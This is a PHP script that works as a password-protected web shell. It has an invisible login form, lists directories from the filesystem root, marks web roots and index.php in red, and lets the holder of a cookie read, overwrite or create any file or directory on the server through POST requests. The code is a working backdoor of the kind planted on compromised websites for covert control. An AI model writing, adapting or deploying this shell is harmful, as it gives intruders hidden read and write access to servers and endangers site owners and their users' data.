<?php 
$pass = '272702f83c3ad6761521702a4404a1b5';
$key = 'sacdsva3s534v35dvs354scasda5av135sdav65sd4';  
 
if($_GET['do'] == 'login' AND md5($_POST['pass']) == $pass){
	setcookie ('key', $key, time()+184600, '/');
	$_COOKIE['key'] = $key;
}


if($_COOKIE['key'] != $key){
	
	$LOGIN_FORM = <<<HTML
	<meta charset="utf-8">
	<form action="?do=login" method="post" style="text-align:center; opacity:0;">
	<input type="password" name="pass" placeholder=""><br> 
	<input type="submit" value="ent">
	</form>
HTML;

	die($LOGIN_FORM);
	
}
// ---------
if($_POST['f']=='getf'){
	
	die(file_get_contents('/'.$_POST['fn']));
}

if($_POST['f']=='fsave'){
	
	file_put_contents('/'.$_POST['fn'], $_POST['ftxt']);
	die();
}
if($_POST['f']=='mk'){
	
	mkdir($_POST['mn'], 0777);
	die();
}


$base = '/';
if(!empty($_GET['p'])){
	$base = $base.$_GET['p'];
}

$files = scandir($base );


echo 'Path: '.$base.'<br>User: '.get_current_user ().'<br>Dir: <a href="?p='.dirname(__FILE__).'">'. dirname(__FILE__).'<br><br>' ;

foreach($files as $k=>$v){
	if($v == '.' OR $v == '..'){continue;}
	
	if($v == 'www' OR $v == 'httpdoc' OR $v == 'index.php' OR $v == get_current_user ()){
		$red = ' style="color:red;" ';
	}
	$trim_f = trim($base, '/').'/'.$v;
	$trim_f2 = $trim_f;
	if(is_dir('/'.trim($base, '/').'/'.$v)){
		$im_link = 'https://cdn0.iconfinder.com/data/icons/48_px_web_icons/48/Folder.png';
		$pos=1;
	}else{
		$im_link = 'https://www.rarst.net/images/Everythingfastandpowerfulfilesearchutili_BCC3/everything_icon.png';
		$pos = 2;
		$trim_f2 = '#';
	}
	 
	$CNT .= '<div data-position="'.$pos.'" class="link"><img src="'.$im_link.'" style="width:16px;"> <a '.$red.' href="?p=/'.$trim_f2.'">'.$v.'</a> <a href="#edit" onclick="FileEdit(\''.$trim_f.'\');"> &nbsp;&nbsp;✎</a> <span style="color:#ccc;">('.date("d m Y H:i:s.", filectime('/'.$trim_f)).')</span></div>';
	$red  = '';
	$im_link = '';
}


echo <<<HTML
<style>
.link span{float:right;}
.link a{color:blue; text-decoration:none;}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
<script>
function FileSaveEdit(){
	 
    var fd = new FormData;

    fd.append('ftxt', $('#edit').val()); // добавляем значение к запросу &img это имя переменной files на сервере
	fd.append('f', 'fsave');
	fd.append('fn',  $('#filename').val());
	
    $.ajax({
        url: location.href,
        data: fd,
        processData: false,
        contentType: false,
        type: 'POST',
        success: function (data) {
            $(input).parent().prev().attr('src', data);
        }
    });
}

function FileEdit(file){
	$('#filename').val(file);
	jQuery.ajax({
		url:     location.href,  
		type:     "POST",  
		dataType: "html",  
		data: 'f=getf&fn='+file, 
		success: function(response) {
			$('#edit').val(response);
		}
	});
}
function MkDir(){
	 
	jQuery.ajax({
		url:     location.href,  
		type:     "POST",  
		dataType: "html",  
		data: 'f=mk&mn='+$('#dirname').val(), 
		success: function(response) {
		 
		}
	});
}
document.addEventListener("DOMContentLoaded", function(e) {
  Array.prototype.slice.call(document.querySelectorAll('.link')).sort(function(a, b) {
    return a.getAttribute('data-position').localeCompare(b.getAttribute('data-position'));
  }).forEach(function(currValue) {
    currValue.parentNode.appendChild(currValue);
  });
});
</script>
<div>
{$CNT}
</div>
<textarea id="edit" style="width:100%; height:600px;"></textarea>
<input type="text" style="width:100%;" id="filename"><br>
<input type="submit" value="EDIT" onclick="FileSaveEdit();">
<br><br>
New F
<br>
<input type="text" style="width:100%;" id="dirname"><br>
<input type="submit" value="OPEN" onclick="MkDir();">
HTML;
?>